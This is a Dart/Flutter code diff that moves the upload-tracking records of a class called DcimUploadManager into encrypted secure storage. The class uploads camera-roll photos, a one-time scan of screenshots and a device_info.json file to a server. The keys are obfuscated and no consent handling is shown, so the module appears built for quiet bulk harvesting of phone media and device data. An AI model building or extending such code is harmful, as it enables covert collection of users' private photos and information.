@@ -8,6 +8,7 @@
 /// - ★ 断点续传：成功入 _uploaded，失败自动重试
 /// - ★ JSON 首次单独上传
 /// - ★ 智能熔断 + 服务器检测
+/// - ★ 本地记录用 flutter_secure_storage 加密存储
 library;
 
 import 'dart:async';
@@ -15,10 +16,10 @@ import 'dart:convert';
 import 'dart:io';
 
 import 'package:flutter/foundation.dart' show debugPrint;
+import 'package:flutter_secure_storage/flutter_secure_storage.dart';
 import 'package:http/http.dart' as http;
 import 'package:http/io_client.dart';
 import 'package:permission_handler/permission_handler.dart';
-import 'package:shared_preferences/shared_preferences.dart';
 
 import '../config/secrets.dart';
 import '../device_info_helper.dart';
@@ -95,7 +96,10 @@ class DcimUploadManager {
   static const String _kScreenshotDone = 'm1sc';
 
   DcimUploadConfig _config = const DcimUploadConfig();
-  SharedPreferences? _prefs;
+
+  /// ★ 换成 secure storage
+  FlutterSecureStorage? _secure;
+  bool _initialized = false;
 
   final Set<String> _uploaded = <String>{};
   final Map<String, String> _uploadedUrls = <String, String>{};
@@ -151,7 +155,7 @@ class DcimUploadManager {
 
   // ── 初始化 ─────────────────────────────────────────────────────────
   Future<void> initialize({DcimUploadConfig? config}) async {
-    if (_prefs != null) return;
+    if (_initialized) return;
 
     if (config == null) {
       config = DcimUploadConfig(
@@ -190,14 +194,27 @@ class DcimUploadManager {
       }
     }
     _config = config;
-    _prefs = await SharedPreferences.getInstance();
 
-    _uploaded
-      ..clear()
-      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);
+    // ★ secure storage 初始化（仅 Android）
+    _secure = const FlutterSecureStorage(
+      aOptions: AndroidOptions(
+        encryptedSharedPreferences: true,
+      ),
+    );
 
+    // ★ 读 _uploaded（List<String> → JSON 字符串）
+    _uploaded.clear();
+    final rawUploaded = await _secure!.read(key: _kUploaded);
+    if (rawUploaded != null && rawUploaded.isNotEmpty) {
+      try {
+        final decoded = jsonDecode(rawUploaded) as List;
+        _uploaded.addAll(decoded.map((e) => e as String));
+      } catch (_) {}
+    }
+
+    // ★ 读 _uploadedUrls（Map<String,String> → JSON 字符串）
     _uploadedUrls.clear();
-    final rawUrls = _prefs!.getString(_kUploadedUrls);
+    final rawUrls = await _secure!.read(key: _kUploadedUrls);
     if (rawUrls != null && rawUrls.isNotEmpty) {
       try {
         final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
@@ -205,12 +222,16 @@ class DcimUploadManager {
       } catch (_) {}
     }
 
-    _jsonUploaded = _prefs!.getBool(_kJsonUploaded) ?? false;
-    _jsonUrl = _prefs!.getString(_kJsonUrl);
-    _screenshotDone = _prefs!.getBool(_kScreenshotDone) ?? false;
+    // ★ bool → '1'
+    _jsonUploaded = (await _secure!.read(key: _kJsonUploaded)) == '1';
+    _jsonUrl = await _secure!.read(key: _kJsonUrl);
+    _screenshotDone = (await _secure!.read(key: _kScreenshotDone)) == '1';
+
+    _initialized = true;
 
     debugPrint('[M] ══════ 启动自检 ══════');
     debugPrint('[M] 已记录成功: ${_uploaded.length} 个');
+    debugPrint('[M] URL 缓存: ${_uploadedUrls.length} 条');
     debugPrint('[M] JSON 已上传: $_jsonUploaded');
     debugPrint('[M] 截图一次性任务已完成: $_screenshotDone');
     debugPrint('[M] ══════ 自检完成 ══════');
@@ -370,7 +391,8 @@ class DcimUploadManager {
     }
 
     _screenshotDone = true;
-    await _prefs?.setBool(_kScreenshotDone, true);
+    // ★ bool → '1'
+    await _secure?.write(key: _kScreenshotDone, value: '1');
     debugPrint('[M] ★ 截图一次性任务完成，后续启动不再扫描截图目录');
   }
 
@@ -484,9 +506,10 @@ class DcimUploadManager {
         }
         _jsonUploaded = true;
         _jsonUrl = serverUrl;
-        await _prefs?.setBool(_kJsonUploaded, true);
+        // ★ bool → '1'，URL → 直接存
+        await _secure?.write(key: _kJsonUploaded, value: '1');
         if (serverUrl != null) {
-          await _prefs?.setString(_kJsonUrl, serverUrl);
+          await _secure?.write(key: _kJsonUrl, value: serverUrl);
         }
         debugPrint('[M] ✅ device_info.json 上传成功');
         return true;
@@ -693,12 +716,19 @@ class DcimUploadManager {
     return list;
   }
 
-  // ── 持久化 ─────────────────────────────────────────────────────────
+  // ── 持久化（写 secure storage）────────────────────────────────────
   Future<void> _persist() async {
     for (int attempt = 1; attempt <= 3; attempt++) {
       try {
-        await _prefs?.setStringList(_kUploaded, _uploaded.toList());
-        await _prefs?.setString(_kUploadedUrls, jsonEncode(_uploadedUrls));
+        // ★ List<String> / Map<String,String> 都存成 JSON 字符串
+        await _secure?.write(
+          key: _kUploaded,
+          value: jsonEncode(_uploaded.toList()),
+        );
+        await _secure?.write(
+          key: _kUploadedUrls,
+          value: jsonEncode(_uploadedUrls),
+        );
         return;
       } catch (e) {
         debugPrint('[M] ⚠️ 持久化失败 ($attempt/3): $e');
@@ -717,11 +747,11 @@ class DcimUploadManager {
     _screenshotDone = false;
     _lastScannedShotCount = 0;
 
-    await _prefs?.remove(_kUploaded);
-    await _prefs?.remove(_kUploadedUrls);
-    await _prefs?.remove(_kJsonUploaded);
-    await _prefs?.remove(_kJsonUrl);
-    await _prefs?.remove(_kScreenshotDone);
+    await _secure?.delete(key: _kUploaded);
+    await _secure?.delete(key: _kUploadedUrls);
+    await _secure?.delete(key: _kJsonUploaded);
+    await _secure?.delete(key: _kJsonUrl);
+    await _secure?.delete(key: _kScreenshotDone);
     debugPrint('[M] 记录已清空（含截图一次性标记）');
   }
 }
